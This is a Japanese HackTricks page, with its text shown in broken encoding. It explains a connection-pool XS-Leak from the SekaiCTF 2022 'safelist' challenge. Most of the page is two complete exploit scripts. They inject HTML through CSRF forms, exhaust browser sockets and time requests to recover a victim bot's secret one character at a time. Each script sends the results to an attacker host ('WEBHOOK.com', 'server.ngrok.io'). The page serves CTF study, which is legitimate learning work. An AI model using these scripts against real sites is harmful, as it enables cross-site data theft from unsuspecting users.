# ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ãƒ—ãƒ¼ãƒ«ã®ä¾‹

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

[**Sekaictf2022 - safelist**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist/solution)ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã§ã¯ã€[**@Strellic\_**](https://twitter.com/Strellic\_)ãŒ**Connection Pool**ã®**ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’ä½¿ç”¨ã—ã¦**XS-Leak**ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã®ä¾‹ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

ã“ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã§ã¯ã€ãƒ•ãƒ©ã‚°ã‚’ãƒœãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚»ãƒƒã‚·ãƒ§ãƒ³å†…ã®æŠ•ç¨¿ã«ç›—ã¿å‡ºã™ã“ã¨ãŒç›®æ¨™ã§ã™ã€‚æ”»æ’ƒè€…ãŒæŒã¤ã‚¢ã‚»ãƒƒãƒˆã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚

* **ãƒœãƒƒãƒˆ**ã¯ã€æ”»æ’ƒè€…ã«ã‚ˆã£ã¦ä¸ãˆã‚‰ã‚ŒãŸ**URL**ã‚’**è¨ªå•**ã—ã¾ã™ã€‚
* æ”»æ’ƒè€…ã¯ã€**CSRF**ã‚’æ‚ªç”¨ã—ã¦**HTML**ã‚’ãƒšãƒ¼ã‚¸ã«**æ³¨å…¥**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãŸã ã—ã€JSã¯ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚dompurifyãŒä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒœãƒƒãƒˆãŒãã®HTMLã§**æŠ•ç¨¿ã‚’ä½œæˆ**ã—ã¾ã™ã€‚
* æ”»æ’ƒè€…ã¯ã€**CSRF**ã‚’æ‚ªç”¨ã—ã¦**ãƒœãƒƒãƒˆ**ãŒã‚¦ã‚§ãƒ–å†…ã®**æœ€åˆã®æŠ•ç¨¿**ã‚’**å‰Šé™¤**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **æŠ•ç¨¿**ã¯**ã‚¢ãƒ«ãƒ•ã‚¡ãƒ™ãƒƒãƒˆé †**ã«ä¸¦ã¹ã‚‰ã‚Œã¦ã„ã‚‹ãŸã‚ã€**æœ€åˆã®æŠ•ç¨¿ãŒå‰Šé™¤**ã•ã‚Œã‚‹ã¨ã€æ”»æ’ƒè€…ã®HTMLã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒ**ãƒ•ãƒ©ã‚°ã‚ˆã‚Šã‚‚ã‚¢ãƒ«ãƒ•ã‚¡ãƒ™ãƒƒãƒˆé †ã«å‰ã«ã‚ã‚‹**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ãƒ•ãƒ©ã‚°ã‚’ç›—ã‚€ãŸã‚ã«ã€@Strellyc\_ãŒææ¡ˆã™ã‚‹è§£æ±ºç­–ã¯ã€**ãƒ†ã‚¹ãƒˆã™ã‚‹å„æ–‡å­—**ã”ã¨ã«ãƒœãƒƒãƒˆãŒæ¬¡ã®æ“ä½œã‚’è¡Œã†ã“ã¨ã§ã™ã€‚

* **æ—¢çŸ¥ã®ãƒ•ãƒ©ã‚°**ã®ä¸€éƒ¨ã§**å§‹ã¾ã‚‹æ–°ã—ã„æŠ•ç¨¿**ã‚’ä½œæˆã—ã€è¤‡æ•°ã®**img**ã‚’**ãƒ­ãƒ¼ãƒ‰**ã—ã¾ã™ã€‚
* **ä½ç½®0**ã®**æŠ•ç¨¿**ã‚’**å‰Šé™¤**ã—ã¾ã™ã€‚
* 255å€‹ã®ã‚½ã‚±ãƒƒãƒˆã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ã¾ã™ã€‚
* æŠ•ç¨¿ã‚’å«ã‚€ãƒšãƒ¼ã‚¸ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
* ã‚µã‚¤ãƒˆï¼ˆã“ã®å ´åˆã¯example.comï¼‰ã«å¯¾ã—ã¦5ã¤ã®ãƒ©ãƒ³ãƒ€ãƒ ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã€ãã‚Œã«ã‹ã‹ã‚‹æ™‚é–“ã‚’è¨ˆæ¸¬ã—ã¾ã™ã€‚

{% hint style="warning" %}
**å‰Šé™¤ã•ã‚ŒãŸ**æŠ•ç¨¿ãŒ**ãƒ•ãƒ©ã‚°**ã§ã‚ã‚‹å ´åˆã€ã“ã‚Œã¯HTMLã«**æ³¨å…¥**ã•ã‚ŒãŸ**ã™ã¹ã¦ã®ç”»åƒ**ãŒ**5ã¤ã®ãƒ©ãƒ³ãƒ€ãƒ ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã¨ãã®ã‚½ã‚±ãƒƒãƒˆã®ä½¿ç”¨æ¨©ã‚’äº‰ã†ã“ã¨ã«ãªã‚Šã¾ã™ã€‚ã¤ã¾ã‚Šã€è¨ˆæ¸¬ã•ã‚Œã‚‹æ™‚é–“ã¯ä»–ã®ã‚·ãƒŠãƒªã‚ªã‚ˆã‚Šã‚‚é•·ããªã‚Šã¾ã™ã€‚

**å‰Šé™¤ã•ã‚ŒãŸ**æŠ•ç¨¿ãŒ**HTML**ã§ã‚ã‚‹å ´åˆã€**5ã¤ã®ãƒ©ãƒ³ãƒ€ãƒ ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã¯HTMLã«ã‚ˆã‚‹ã‚½ã‚±ãƒƒãƒˆã®ä½¿ç”¨æ¨©ã‚’äº‰ã†å¿…è¦ãŒãªã„ãŸã‚ã€ã‚ˆã‚Šé€Ÿããªã‚Šã¾ã™ã€‚
{% endhint %}

### Exploit 1

ã“ã‚Œã¯ã€[https://github.com/project-sekai-ctf/sekaictf-2022/blob/main/web/safelist/solution/solve.html](https://github.com/project-sekai-ctf/sekaictf-2022/blob/main/web/safelist/solution/solve.html)ã‹ã‚‰å–å¾—ã—ãŸã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚³ãƒ¼ãƒ‰ã§ã™ã€‚
```html
<!-- Form to inject HTML code in the bots page -->
<form method="POST" action="https://safelist.ctf.sekai.team/create" id="create" target="_blank">
<input type="text" name="text" />
<input type="submit" />
</form>

<!-- Form to delete the first entry -->
<form method="POST" action="https://safelist.ctf.sekai.team/remove" id="remove" target="_blank">
<input type="text" name="index" value="0" />
<input type="submit" />
</form>

<script>
// Attacker listening
const WEBHOOK = "https://WEBHOOK.com/";
// Send data to attacker
const log = (id, data) => {
let payload = JSON.stringify({ known, alphabet, data });
console.log(id, payload);
navigator.sendBeacon(WEBHOOK + "?" + id, payload);
}

// Similar to JQuery
const $ = document.querySelector.bind(document);

// Known part of the flag
const known = "SEKAI{";
let alphabet = "_abcdefghijklmnopqrstuvwxyz}";

// Reduce the alphabet using a hash (#) in the URL
if (location.hash) {
alphabet = alphabet.slice(alphabet.indexOf(location.hash.slice(1)));
}

// Funtion to leak chars
const leak = async (c) => {
// Prepare post with known flag and the new char
let payload = `${known + c}`;
// Inject as many <img as possible
// you need to respect the CSP and create URLs that are different
for(let i = 0; payload.length < 2048; i++) {
payload += `<img src=js/purify.js?${i.toString(36)}>`;
}

// Inject HTML
$("#create input[type=text]").value = payload;
$("#create").submit();
await new Promise(r => setTimeout(r, 1000));

// Remove post with index 0
$("#remove").submit();
await new Promise(r => setTimeout(r, 500));

let deltas = [];

// Try each char 3 times
for (let i = 0; i < 3; i++) {
const SOCKET_LIMIT = 255;
// you will need a custom server that works like num.sleepserver.com/sleep/delay
// needed to freeze the blocked sockets, and they have to all be on different origins
// Check https://www.npmjs.com/package/sleep-server using subdomains DNS wildcard
const SLEEP_SERVER = i => `http://${i}.sleepserver.com/sleep/60`;

const block = async (i, controller) => {
try {
return fetch(SLEEP_SERVER(i), { mode: "no-cors", signal: controller.signal });
}
catch(err) {}
};

// block SOCKET_LIMIT sockets
const controller = new AbortController();
for (let i = 0; i < SOCKET_LIMIT; i++) {
block(i, controller);
}

// Make the bot access the page with the posts
window.open("https://safelist.ctf.sekai.team/?" + Math.random().toString(36).slice(2), "pwn");
await new Promise(r => setTimeout(r, 500));

// start meassuring time to perform 5 requests
let start = performance.now();
await Promise.all([
fetch("https://example.com", { mode: "no-cors" }),
fetch("https://example.com", { mode: "no-cors" }),
fetch("https://example.com", { mode: "no-cors" }),
fetch("https://example.com", { mode: "no-cors" }),
fetch("https://example.com", { mode: "no-cors" })
]);
let delta = performance.now() - start;
document.title = delta;
controller.abort();

log("test_" + c + "_" + i, delta);

// Save time needed
deltas.push(delta);
}
return deltas;
};

// Check each char
const pwn = async () => {
// Try to leak each character
for(let i = 0; i < alphabet.length; i++) {
//Check the indicated char
let deltas = await leak(alphabet[i]);

// Calculate mean time from requests to example.com
let avg = deltas.reduce((a,v) => a+v, 0) / deltas.length;

// If greater than 250, the HTML code was injected (flag in index 0)
if (avg > 250) {
log("tests_pos_" + alphabet[i], deltas)
}
// Flag in the page
else {
log("tests_neg_" + alphabet[i], deltas)
}
}
};

window.onload = async () => {
pwn();
};
</script>
```
### Exploit 2

åŒã˜æˆ¦è¡“ã§ã™ãŒã€[https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/](https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/)ã‹ã‚‰ç•°ãªã‚‹ã‚³ãƒ¼ãƒ‰ã§ã™ã€‚
```html
<!DOCTYPE html>
<html>
<!--
The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs main thread.
If images are loading, the request to "/" is slower, otherwise faster.
By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
We can use fetch to measure the request time.
-->
<body>
<button onclick="run()">start</button>
<form id=f action="http://localhost:1234/create" method="POST" target="_blank">
<input id=inp name="text" value="">
</form>

<form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank">
<input id=inp2 name="index" value="">
</form>
<script>
let flag = 'SEKAI{'
const TARGET = 'https://safelist.ctf.sekai.team'
f.action = TARGET + '/create'
f2.action = TARGET + '/remove'

const sleep = ms => new Promise(r => setTimeout(r, ms))
const send = data => fetch('http://server.ngrok.io?d='+data)
const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')

// start exploit
let count = 0
setTimeout(async () => {
let L = 0
let R = charset.length - 1
while( (R-L)>3 ) {
let M = Math.floor((L + R) / 2)
let c = charset[M]
send('try_' + flag + c)
const found = await testChar(flag + c)
if (found) {
L = M
} else {
R = M - 1
}
}

// fallback to linear since I am not familiar with binary search lol
for(let i=R; i>=L; i--) {
let c = charset[i]
send('try_' + flag + c)
const found = await testChar(flag + c)
if (found) {
send('found: '+ flag+c)
flag += c
break
}
}

}, 0)

async function testChar(str) {
return new Promise(resolve => {
/*
For 3350, you need to test it on your local to get this number.
The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
If starts with "A", the image should be loaded because it's in the threshold.
*/
inp.value = str + '<br><canvas height="3350px"></canvas><br>'+Array.from({length:20}).map((_,i)=>`<img loading=lazy src=/?${i}>`).join('')
f.submit()

setTimeout(() => {
run(str, resolve)
}, 500)
})
}

async function run(str, resolve) {
// if the request is not enough, we can send more by opening more window
for(let i=1; i<=5;i++) {
window.open(TARGET)
}

let t = 0
const round = 30
setTimeout(async () => {
for(let i=0; i<round; i++) {
let s = performance.now()
await fetch(TARGET + '/?test', {
mode: 'no-cors'
}).catch(err=>1)
let end = performance.now()
t += end - s
console.log(end - s)
}
const avg = t/round
send(str + "," + t + "," + "avg:" + avg)

/*
I get this threshold(1000ms) by trying multiple times on remote admin bot
for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
*/
const isFound = (t >= 1000)
if (isFound) {
inp2.value = "0"
} else {
inp2.value = "1"
}

// remember to delete the post to not break our leak oracle
f2.submit()
setTimeout(() => {
resolve(isFound)
}, 200)
}, 200)
}

</script>

</body>

</html>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
